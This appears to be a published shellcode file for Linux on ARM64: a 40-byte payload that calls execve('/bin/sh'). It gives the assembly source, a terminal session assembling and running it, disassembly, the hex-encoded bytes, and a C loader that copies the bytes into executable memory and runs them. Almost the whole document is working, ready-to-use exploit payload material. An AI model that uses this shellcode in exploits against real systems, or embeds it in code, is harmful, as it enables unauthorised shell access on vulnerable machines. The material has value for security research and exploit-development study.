/*
# Title:  Linux/ARM64 - execve("/bin/sh", NULL, NULL) Shellcode (40 Bytes)
# Date:   2019-06-30
# Tested: Ubuntu 16.04 (aarch64)
# Author: Ken Kitahara
# Compilation: gcc -o loader loader.c


ubuntu@ubuntu:~/works$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu Xenial Xerus (development branch)
Release:	16.04
Codename:	xenial
ubuntu@ubuntu:~/works$ uname -a
Linux ubuntu 4.2.0-16-generic #19-Ubuntu SMP Thu Oct 8 15:00:45 UTC 2015 aarch64 aarch64 aarch64 GNU/Linux
ubuntu@ubuntu:~/works$ cat execve.s
.section .text
.global _start
_start:
    // execve("/bin/sh", NULL, NULL)
    mov  x1, #0x622F            // x1 = 0x000000000000622F ("b/")
    movk x1, #0x6E69, lsl #16   // x1 = 0x000000006E69622F ("nib/")
    movk x1, #0x732F, lsl #32   // x1 = 0x0000732F6E69622F ("s/nib/")
    movk x1, #0x68, lsl #48     // x1 = 0x0068732F6E69622F ("hs/nib/")
    str  x1, [sp, #-8]!         // push x1
    mov  x1, xzr                // args[1] = NULL
    mov  x2, xzr                // args[2] = NULL
    add  x0, sp, x1             // args[0] = pointer to "/bin/sh\0"
    mov  x8, #221               // Systemcall Number = 221 (execve)
    svc  #0x1337                // Invoke Systemcall
ubuntu@ubuntu:~/works$ as -o execve.o execve.s && ld -o execve execve.o
ubuntu@ubuntu:~/works$ ./execve
$ id
uid=1000(ubuntu) gid=1000(ubuntu) groups=1000(ubuntu),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),107(netdev)
$ exit
ubuntu@ubuntu:~/works$ objdump -d ./execve

./execve:     file format elf64-littleaarch64


Disassembly of section .text:

0000000000400078 <_start>:
  400078:	d28c45e1 	mov	x1, #0x622f                	// #25135
  40007c:	f2adcd21 	movk	x1, #0x6e69, lsl #16
  400080:	f2ce65e1 	movk	x1, #0x732f, lsl #32
  400084:	f2e00d01 	movk	x1, #0x68, lsl #48
  400088:	f81f8fe1 	str	x1, [sp,#-8]!
  40008c:	aa1f03e1 	mov	x1, xzr
  400090:	aa1f03e2 	mov	x2, xzr
  400094:	8b2163e0 	add	x0, sp, x1
  400098:	d2801ba8 	mov	x8, #0xdd                  	// #221
  40009c:	d40266e1 	svc	#0x1337
ubuntu@ubuntu:~/works$ objcopy -O binary execve execve.bin
ubuntu@ubuntu:~/works$ hexdump -v -e '"\\""x" 1/1 "%02x" ""' execve.bin && echo
\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b\xa8\x1b\x80\xd2\xe1\x66\x02\xd4

*/

#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] =
"\xe1\x45\x8c\xd2\x21\xcd\xad\xf2\xe1\x65\xce\xf2\x01\x0d\xe0\xf2"
"\xe1\x8f\x1f\xf8\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xe0\x63\x21\x8b"
"\xa8\x1b\x80\xd2\xe1\x66\x02\xd4";

int main(int argc, char **argv) {
    printf("Shellcode Length: %zd Bytes\n", strlen(shellcode));

    void *ptr = mmap(0, 0x100, PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);

    if (ptr == MAP_FAILED) {
        perror("mmap");
        exit(-1);
    }

    memcpy(ptr, shellcode, sizeof(shellcode));
    sc = ptr;

    sc();

    return 0;
}